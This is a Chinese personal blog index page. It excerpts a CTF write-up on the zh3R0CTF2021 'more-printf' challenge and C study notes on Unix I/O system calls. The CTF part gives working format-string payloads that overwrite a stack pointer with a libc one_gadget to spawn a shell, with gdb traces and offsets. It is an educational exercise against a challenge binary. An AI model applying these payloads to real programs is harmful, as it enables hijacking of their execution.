<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>唐仔橙</title><meta name="author" content="唐仔橙,tangzicheng233@gmail.com"><meta name="copyright" content="唐仔橙"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="喜欢探索世界,在读研究生,计算机爱好者的成长记录">
<meta property="og:type" content="website">
<meta property="og:title" content="唐仔橙">
<meta property="og:url" content="https://tangzichengcc.github.io/page/2/index.html">
<meta property="og:site_name" content="唐仔橙">
<meta property="og:description" content="喜欢探索世界,在读研究生,计算机爱好者的成长记录">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://tangzichengcc.github.io/img/profile.png">
<meta property="article:author" content="唐仔橙">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://tangzichengcc.github.io/img/profile.png"><link rel="shortcut icon" href="/img/favicon.webp"><link rel="canonical" href="https://tangzichengcc.github.io/page/2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="MTZmw-Jp9gUmwt4q-TLzEzI1_TFDA2QpQLuyUeOqzk4"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":500,"languages":{"author":"作者: 唐仔橙","link":"链接: ","source":"来源: 唐仔橙","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '唐仔橙',
  isPost: false,
  isHome: true,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2024-02-11 16:49:50'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/profile.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">88</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('/img/index_img.gif')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">唐仔橙</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">唐仔橙</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/tangzichengcc" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/" title="pwn入门-47-zh3R0CTF2021-moreprintf">pwn入门-47-zh3R0CTF2021-moreprintf</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-12T15:40:29.000Z" title="发表于 2023-11-12 23:40:29">2023-11-12</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-16T13:07:51.662Z" title="更新于 2023-11-16 21:07:51">2023-11-16</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">这个题还有一些奇奇怪怪的问题, 但是怕自己跑偏了,就暂时先放下了,后面有空再研究.(或许和fprintf的机制有关?
​	先复习一下格式化字符串,本来想看看之前自己写的笔记…看了一下后想起来了一句名言,大意就是你去修改一个很烂的项目不如重构….恩….写的太烂了…不如重写一篇…
格式化字符串漏洞基础%n​	为什么能写入值呢,就是这个%n,它是将之前已经打印的字符个数赋值给当前偏移处的指针指向的地址
​	例如%100×10$n: 将100写入第十个位置所保存的指针指向的地址(4字节), %$hn是2字节,%$hhn是1字节,%$lln是8字节
%p​	%p %p %p %p %p %p %p %p %p %p 
​	在b *fprintf+143也就是vprintf下断点,然后set $rdi&#x3D;_IO_stdout, 单步,就可以打印地址了
1*RSI  0x55555555b4c0 ◂— &#x27;0x55555555b260 0x7ffff7af2151 0x7ffff7dcf8c0 0x7ffff7ff5540 0x7fffffffe470 0xb1dad8e32f5ad200 0x5555555552c0 0x7ffff7a03bf7 0x1 0x7fffffffe568\n&#x27;

​	前四个值和后四个值

%c​	c是一个字符的意思, 在后面的exp中,%c%c%c%5c%hhn表示,前三次输出,都是输出一个字符,第四次是5个字符,然后一共是8个字节了,把8写入第5个位置的指针指向的地址.
​	set $rdi&#x3D;_IO_stdout  ( 其他版本呢?)
​	%caaa%cbbb%cccc%5cddd%hhn,
​	可以看到确实只打印了第一个字符,然后%5c是把不足的用空格补齐
1`aaaQbbb�ccc    @ddd





​	然后把值写到了第5个位置的指针指向的地址
​	用%c%c%c%5c%hhn试一下, 可以看到确实是改成了0x08


​	但在我这里应该是要改成0xc8 不过其实应该没影响,都是把read地方的值改成onegadget
任意地址写修改值1%c%c%c%5c%hhn%*8$d%186326c%5$n

​	
​	除了wp给的payload,换其他的很多都不行…为什么呢?? 仔细观察源码, 有输入长度的限制的,  fgets(buffer, 31, stdin); 
​	如果不是单纯做题而是研究一下打法的话,可以拓展一下长度试试,这样的话应该就好很多,(可以加系统调用限制,然后又是orw的一道题(x)) (或者直接在运行的时候改寄存器,修改读入长度)
修改ret返回值(x)123456781a:00d0│     0x7fffffffe4a0 —▸ 0x555555555100 (_start) ◂— endbr641b:00d8│     0x7fffffffe4a8 —▸ 0x5555555552af (main+198) ◂— mov edi, 11c:00e0│     0x7fffffffe4b0 ◂— 0x7fffffffe4b01d:00e8│     0x7fffffffe4b8 ◂— 0xb8204e953bb68d001e:00f0│ rbp 0x7fffffffe4c0 —▸ 0x5555555552c0 (__libc_csu_init) ◂— endbr641f:00f8│     0x7fffffffe4c8 —▸ 0x7ffff7a03c87 (__libc_start_main+231) ◂— mov edi, eax    %c%c%c%197c%hhn%*8$d%????c%5$n



onegadget - (200 + 0x21c87 )就是要改的值了
1234567891011120x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  rsp &amp; 0xf == 0  rcx == NULL0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  [rsp+0x40] == NULL0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL

0x4f2a5- (200 + 0x21c87 ) &#x3D; 185686
%c%c%c%197c%hhn%*8$d%185686c%5$n
邪门,就是不出c8,概率比较小,可能和系统有关?
改成0x18吧…
%c%c%c%21c%hhn%*8$d%185862c%5$n
但还是不行..
问题出在这个函数没有ret的….那….. 所以覆盖了也没用…
fprintf之后有ret 回main函数的exit, 是不是可以修改这里呢? 这里就是下面的main+198

改其他的函数指针,比如改main+1980x556fe88e42af这里会执行到的,但是是把这里的值改了(用watch下断点查看)
1234561a:00d0│     0x7ffca5108380 —▸ 0x556fe88e4100 (_start) ◂— endbr641b:00d8│     0x7ffca5108388 —▸ 0x556fe88e42af (main+198) ◂— mov edi, 11c:00e0│     0x7ffca5108390 ◂— 0x7ffca51083901d:00e8│     0x7ffca5108398 ◂— 0x695c632b96376d001e:00f0│ rbp 0x7ffca51083a0 —▸ 0x556fe88e42c0 (__libc_csu_init) ◂— endbr641f:00f8│     0x7ffca51083a8 —▸ 0x7fc96c879c87 (__libc_start_main+231) ◂— mov edi, eax



修改下内存测试下
0x7f8d3724c000+0x4f2a5  &#x3D; 0x7f8d3729b2a5
set *0x7ffc28b196d8&#x3D; 0x7f8d3729b2a5 (为啥一次设置不全呢?)
set *0x7ffc28b196dc&#x3D; 0x7f8d
这里会把这个值修改一下,但不知道后面会不会执行, 会执行!!!
0x18: %c%c%c%21c%hhn%*8$d%185862c%5$n
0x28: %c%c%c%37c%hhn%*8$d%185846c%5$n
 但是没办法一次改完….得两次啊,不对,应该用%lln
0x18: %c%c%c%21c%hhn%*8$d%185862c%5$lln
0x28: %c%c%c%37c%hhn%*8$d%185846c%5$lln
不过为什么好像没有改成8字节,还是4字节呢?
以及,是否可以修改两次4字节呢… 方法有点多,但会越来越复杂…先暂时放一下
如何确定能到read​	那就算修改了read, 怎么确定一定会执行到read呢, 不是执行到read,而是执行到栈里的这个地方,把那里的值改了,看wp一头雾水,wp中的调用链在本地测试不是这样
​	所以我感觉有几份就是瞎扯淡,瞎蒙的(不过也可能是自己认识不足

​	是在vprift里面触发的
​	哦卧槽,这和栈的结构有关….?? 为什么返回地址会到这呢??
​	改rsp上面那个值才行
123456789101112131415161718192021222324252627282930311c:00e0│     0x7ffd959070f0 —▸ 0x7ffd95907008 ◂— 0x7f2523745be71d:00e8│     0x7ffd959070f8 ◂— 0xbaa72d067a954f001e:00f0│ rbp 0x7ffd95907100 —▸ 0x562fc10992c0 (__libc_csu_init) ◂— endbr641f:00f8│     0x7ffd95907108 —▸ 0x7f25dc8e7bf7 (__libc_start_main+231) ◂— mov edi, eaxpwndbg&gt; bt#0  0x00007f2523745be7 in ?? ()#1  0x0000003000000030 in ?? ()#2  0x00007ffd959070f8 in ?? ()#3  0x00007ffd95907030 in ?? ()#4  0xbaa72d067a954f00 in ?? ()#5  0x00007f25dccb1a00 in ?? () from ./libc.so.6#6  0x00007f25dccae2a0 in ?? () from ./libc.so.6#7  0x0000562fc300d260 in ?? ()#8  0x00007f25dc9d6151 in __GI___libc_read (fd=-1785699856, buf=0x562fc300d27e, nbytes=0) at ../sysdeps/unix/sysv/linux/read.c:27#9  0x00007f25dccb38c0 in _IO_stdfile_2_lock () from ./libc.so.6#10 0x00007f25dcedf540 in ?? ()#11 0xffffffffffffffb0 in ?? ()#12 0x0000000000000000 in ?? ()                pwndbg&gt; tele $rsp-0x1000:0000│     0x7ffd95907000 —▸ 0x7ffd95907100 —▸ 0x562fc10992c0 (__libc_csu_init) ◂— endbr6401:0008│     0x7ffd95907008 ◂— 0x7f2523745be702:0010│ rsp 0x7ffd95907010 ◂— 0x3000000030 /* &#x27;0&#x27; */03:0018│     0x7ffd95907018 —▸ 0x7ffd959070f8 ◂— 0xbaa72d067a954f0004:0020│     0x7ffd95907020 —▸ 0x7ffd95907030 —▸ 0x7f25dccb1a00 (_IO_2_1_stdin_) ◂— 0xfbad208b05:0028│     0x7ffd95907028 ◂— 0xbaa72d067a954f0006:0030│     0x7ffd95907030 —▸ 0x7f25dccb1a00 (_IO_2_1_stdin_) ◂— 0xfbad208b07:0038│     0x7ffd95907038 —▸ 0x7f25dccae2a0 (__GI__IO_file_jumps) ◂— 0x0



123456789pwndbg&gt; tele $rsp-0x800:0000│     0x7ffea6ecc4b8 —▸ 0x7fa5e518df44 (fprintf+148) ◂— mov rcx, qword ptr [rsp + 0x18]01:0008│ rsp 0x7ffea6ecc4c0 ◂— 0x3000000030 /* &#x27;0&#x27; */02:0010│     0x7ffea6ecc4c8 —▸ 0x7ffea6ecc5a8 ◂— 0x3d76d5b60521190003:0018│     0x7ffea6ecc4d0 —▸ 0x7ffea6ecc4e0 —▸ 0x7fa5e5514a00 (_IO_2_1_stdin_) ◂— 0xfbad208b04:0020│     0x7ffea6ecc4d8 ◂— 0x3d76d5b60521190005:0028│     0x7ffea6ecc4e0 —▸ 0x7fa5e5514a00 (_IO_2_1_stdin_) ◂— 0xfbad208b06:0030│     0x7ffea6ecc4e8 —▸ 0x7fa5e55112a0 (__GI__IO_file_jumps) ◂— 0x007:0038│     0x7ffea6ecc4f0 —▸ 0x55e932c72260 ◂— &#x27;%c%c%c%5c%hhn%*8$d%186326c%5$n&#x27;



题目分析源代码12345678910111213141516171819202122232425262728/* gcc -o more-printf -fstack-protector-all more-printf.c */#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;FILE *fp;char *buffer;uint64_t i = 0x8d9e7e558877;_Noreturn main() &#123;  /* Just to save some of your time */  uint64_t *p;  p = &amp;p;  /* Chall */  setbuf(stdin, 0);  buffer = (char *)malloc(0x20 + 1); //为啥要+1? 感觉好像不加也一样  fp = fopen(&quot;/dev/null&quot;, &quot;wb&quot;);  fgets(buffer, 0x1f, stdin);  if (i != 0x8d9e7e558877) &#123;    _exit(1337);  &#125; else &#123;    i = 1337;    fprintf(fp, buffer);    _exit(1);  &#125;&#125;



逻辑分析12345678910111213141516int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  __int64 v3[2]; // [rsp+0h] [rbp-10h] BYREF  v3[1] = __readfsqword(0x28u);  v3[0] = (__int64)v3;  setbuf(stdin, 0LL);  buffer = (char *)malloc(0x21uLL);  fp = fopen(&quot;/dev/null&quot;, &quot;wb&quot;);  fgets(buffer, 31, stdin);  if ( i != 0x8D9E7E558877LL )    _exit(1337);  i = 1337LL;  fprintf(fp, buffer);  _exit(1);&#125;

​	能够看到没有溢出,有一次格式化字符串利用的机会, 我在想是不是可以直接把返回地址修改成onegadget呢? 答案没采用这种方法,后面证实确实不行,一个是没有ret, 换别的函数的ret没有合适的指针(存疑)
​	先用%p泄露地址,能够看到第二个地址是比较特殊的, read函数,如果可以修改后面几个字节, 改为和onegadget一样,通过枚举,alsr偏移也一样的话,就可以getshell了,onegadget的话 0x4f3d5, 有五位不同, 枚举的话还是需要挺长时间的.. (不需要通过枚举,完全可以利用现有的指针),也就是第8个参数
​	__libc_start_main+231知道这里的值,加上偏移就是onegadget的值了!
123__libc_start_main+231: 0x7ffff7a03bf7onegadget : 0x7ffff7a313d5相差: onegadget-__libc_start_main+231 = 0x2d7de = 186334





​	作者认为修改的read+17这个值是修改完后才会执行到的…依据是什么呢,如果不是这样的呢?
​	下断点: b *read 下不了…q
​	要输入payload: %c%c%c%5c%hhn%*8$d%186326c%5$n	也不行
​	
​	可以下watch断点的, watch一下要修改的地方的地址
123456pwndbg&gt; info bNum     Type           Disp Enb Address            What7       breakpoint     keep y   0x00007ffff7a46f3f in __fprintf at fprintf.c:32	breakpoint already hit 1 time9       breakpoint     keep n   0x00007ffff7af2140 in __GI___libc_read at ../sysdeps/unix/sysv/linux/read.c:2711      breakpoint     keep y   0x00007ffff7af2140 in __GI___libc_read at ../sysdeps/unix/sysv/linux/read.c:27



下的断点没用呢… 换个patchelf试试,
2.27-3ubuntu1.4
https://surager.pub/_posts/2021-05-11-x86架构下pwn题目libc概述/
先用这个吧 2.27-3ubuntu1.5_amd64
进去一会后按c, 就能够进入最后的调试了,不行就下一个,继续c
关键再c就退出去了..
注意下断点的地址, exit可以 那是不是可以下system\execve
直接q然后继续就好了
gdb –pid 进去
为什么这里就可以只枚举32呢?​	所以对抗alsr的点不是在onegadget这个地址上,这里是确定的, 那什么是不确定的呢?
​	就是要修改的地址的地址, 它不一定是0x08,可能是0x18 28 也可能是0x00 0x20, 所以才会有32种可能
​	不过在我的电脑上, 第2的字节的一半也变了…那随机化的范围又大了(关闭随机化的情况下,开启了好像又一样了)
​	
实际修改的指针​	
​	改的其实是上面的函数的地址(实测)  作者提出的修改read+17行不通

调试下断点和bt回溯遇到了问题​	首先,bt回溯时候的各种问题,我认为是因为劫持控制流破坏了识别算法, 识别不出来,
syscall能下断点吗
do_system
gdb 执行了新的sh,怎么跟踪呢? 如何看上一个进程的bt
为什么会执行到上面那里呢?
为什么会从那里取值rip呢?
这里貌似是比较重要的函数

这里面进行解析的吧, 是的,所以重点应该在这里
printf_positional
怎么样才能跟踪执行流呢
故意输错 让他卡在那是不是就可以了
注意看这里, 返回了最开始的栈帧,

为什么只链接了那两个就可以了??????问题  buffer &#x3D; (char *)malloc(0x20 + 1); &#x2F;&#x2F;为啥要+1? 感觉好像不加也一样
​	set $rdi&#x3D;_IO_stdout  ( 其他版本呢?)
set *0x7ffc28b196d8&#x3D; 0x7f8d3729b2a5 (为啥一次设置不全呢?)
以及,是否可以修改两次4字节呢… 方法有点多,但会越来越复杂…先暂时放一下
​	如何下断点来到这里呢? 最后返回onegadget的时候下不了断点
gdb启动的时候如何多下几个断点
为什么会从从rsp上面取值? 
tipsgdb中如何关了alsr调试呢
12set disable-randomization on 关闭set disable-randomization off 开启



参考https://www.anquanke.com/post/id/85785
https://xz.aliyun.com/t/12304
https://www.hakuya.work/post/2
https://violenttestpen.github.io/ctf/pwn/2021/06/06/zh3r0-ctf-2021/
https://github.com/zh3r0/zh3r0-ctf/tree/main/V2/pwn/more-printf/public/vuln
https://blog.caprinux.com/2021/06/07/zh3ro-ctf-more-printf/
https://sangjun.xyz/125
感觉前面几个讲的方法最后一步都有问题
https://cor.team/posts/zh3r0-ctf-v2-complete-pwn-writeups/
这一篇或许是对的
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/" title="c语言回炉重造-unix系统接口">c语言回炉重造-unix系统接口</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-12T07:29:52.000Z" title="发表于 2023-11-12 15:29:52">2023-11-12</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-12T07:30:55.002Z" title="更新于 2023-11-12 15:30:55">2023-11-12</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/">编程基础</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C%E8%AF%AD%E8%A8%80/">C语言</a></span></div><div class="content">8.2 低级IO read&#x2F;write​	利用这个系统调用来构造高级一点的函数, 库函数之类的
​	系统调用的函数原型集中放在一个头文件syscalls.h中( 事实上目前的系统里只有syscall.h,最后也会调用unistd.h)
123456789101112131415//将输入复制到输出//#include &quot;syscalls.h&quot;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main()&#123;    char buf[BUFSIZ];    int n;        while((n = read(0, buf, BUFSIZ)) &gt; 0 )        write(1, buf,n);    return 0;&#125;



1234io.c:3:10: fatal error: syscalls.h: No such file or directory    3 | #include &quot;syscalls.h&quot;      |          ^~~~~~~~~~~~compilation terminated.

https://blog.csdn.net/sesiria/article/details/52337114
​	PS: &#x2F;usr&#x2F;include&#x2F;目录下存着c的各种头文件,可以从这里寻找
12# cat /usr/include/syscall.h#include &lt;sys/syscall.h&gt;

​	确实是存在这个目录的,但是为什么没找到呢?  syscall.h, 没有s
12#include &quot;syscall.h&quot;#include &lt;stdio.h&gt; //stdio.h里面有BUFSIZ, 或者自己定义一下

​	
​	实现getchar(无缓冲区)
1234567#include &quot;syscalls.h&quot;int getchar(void)&#123;    char c;    return (read(0,&amp;c,1) == 1) ? (unsigned char) c: EOF;&#125;

​		
​	第二版 一次读入一组字符,但每次只输出一个字符(简单的带缓冲区的版本)
​	但是这个函数调用完了,缓冲区什么的也都没了吧?? 不是的, static的生命周期,在整个程序的运行期间都存在
1234567891011121314151617181920212223242526//#include &quot;syscalls.h&quot;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int getchar(void);int main()&#123;    char s;    while((s = getchar())!=EOF)&#123;    	write(1,&amp;s,1);    &#125;&#125;int getchar(void)&#123;	static char buf[BUFSIZ];    static char *bufp = buf;    static int n = 0;        if (n == 0)&#123;//缓冲区为空        n = read(0,buf, sizeof buf);        bufp = buf;    &#125;    return (--n&gt;0) ? (unsigned char) *bufp++ : EOF;&#125;

8.3 open、creat、close和unlink123456#include &lt;fcntl.h&gt;int fd;int open(char *name,int flags,int perms);fd = open(name, flags, perms)



123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdarg.h&gt;#include &lt;stdlib.h&gt;#define PERMS 0666void error(char *,...);int main(int argc, char *argv[])&#123;    int f1,f2,n;    char buf[BUFSIZ];        if (argc != 3)        error(&quot;Usage: cp from to&quot;);    if ((f1 = open(argv[1],O_RDONLY,0)) == -1)        error(&quot;cp: can&#x27;t open %s&quot;,argv[1]);    if ((f2 = creat(argv[2],PERMS)) == -1)        error(&quot;cp: can&#x27;t create %s,mode %03o&quot;,argv[2],PERMS);    while((n = read(f1,buf,BUFSIZ)) &gt; 0)        if(write(f2,buf,n) !=n)            error(&quot;cp: write error on file %s&quot;,argv[2]);    return 0;&#125;void error(char *fmt,...)&#123;    va_list args;        va_start(args,fmt);    fprintf(stderr,&quot;error: &quot;);    vfprintf(stderr,fmt,args);    fprintf(stderr,&quot;\n&quot;);    va_end(args);    exit(1);&#125;



8.5 fopen与getc函数的实现给的iobuf应该是dos的
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;fcntl.h&gt;#include &quot;syscalls.h&quot;#define PERMS 0666FILE *fopen(char *name, char *mode)&#123;    int fd;    FILE *fp;            if (*mode != &#x27;r&#x27; &amp;&amp; *mode !=&#x27;w&#x27; &amp;&amp; *mode!=&#x27;a&#x27;)        return NULL;        for (fp= _iob; fp &lt; _iob + OPEN_MAX; fp++)        if ((fp-&gt;flag &amp; (_READ | _WRITE)) == 0)            break;    if (fp &gt; _iob+OPEN_MAX)        return NULL;        if (*mode == &#x27;w&#x27;)        fd = creat(name,PERMS);   	else if (*mode == &#x27;a&#x27;)&#123;        if ((fd = open(name,O_WRONLY,0)) == -1)            fd = creat(name,PERMS);        lseek(fd,0L,2);    &#125;else        fd = open(name,O_RDONLY,0);        if (fd == -1)        return NULL;        fp-&gt;fd = fd;    fd-&gt;cnt =0;    fp-&gt;base = NULL;    fp-&gt;flag = (*mode == &#x27;r&#x27;) ? _READ : _WRITE;    return fp;&#125;int _fillbuf(FILE *fp)&#123;    int bufsize;        if ((fp-&gt;flag&amp;(_READ|_EOF|_ERR)) != _READ)        return EOF:    bufsize = (fp-&gt;flag &amp; _UNBUF) ? 1 : BUFSIZE;    if (fp-&gt;base == NULL)        if ((fp-&gt;base = (char *) malloc(bufsize)) == NULL)            return EOF;    fp-&gt;ptr = fp-&gt;base;    fp-&gt;cnt = read(fp-&gt;fd, fp-&gt;ptr,bufsize);    if (--fp-&gt;cnt &lt; 0)&#123;        if (fp-&gt;cnt == -1)            fp-&gt;flag |= _EOF;        else            fp-&gt;flag !=_ERR:        fp-&gt;cnt = 0;        return EOF:    &#125;    return (unsigned char) *fp-&gt;ptr++;&#125;





8.6123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139#define NAME_MAX 14typedef struct &#123;    long ino;    char name[NAME_MAX+1];&#125; Dirent;typedef struct&#123;    int fd;    Dirent d;&#125; DIR1;DIR1 *opendir1(char *dirname);Dirent *readdir1(DIR1 *dfd);void closedir1(DIR1 *dfd);#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;//#include &quot;dirent.h&quot;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void fsize(char *);//int stat(char *,struct stat * );void dirwalk(char *, void (*fcn)(char *));int main(int argc, char **argv)&#123;    if (argc == 1)        fsize(&quot;.&quot;);    else        while(--argc &gt; 0)            fsize(*++argv);    return 0;&#125;void fsize(char *name)&#123;    struct stat stbuf;    if (stat(name,&amp;stbuf) == -1)    &#123;		fprintf(stderr,&quot;fsize: can&#x27;t access %s\n&quot;,name);    &#125;    if ((stbuf.st_mode &amp; S_IFMT) == S_IFDIR)	&#123;		printf(&quot;is a dir\n&quot;);		dirwalk(name, fsize);	&#125;    printf(&quot;%8ld %s\n&quot;,stbuf.st_size,name);&#125;#define MAX_PATH 1024void dirwalk(char *dir,void (*fcn)(char *))&#123;    char name[MAX_PATH];    Dirent *dp;    DIR1 *dfd;    if ((dfd = opendir1(dir)) == NULL)    &#123;		fprintf(stderr,&quot;dirwalk: can&#x27;t open %s\n&quot;,dir);        return;    &#125;    	printf(&quot;here\n&quot;);    while ((dp = readdir1(dfd)) != NULL)&#123;        printf(&quot;dp-&gt;name:%s&quot;,dp-&gt;name);		if (strcmp(dp-&gt;name,&quot;.&quot;) ==0 || strcmp(dp-&gt;name,&quot;..&quot;)==0)            continue; //跳过自身和父目录        if 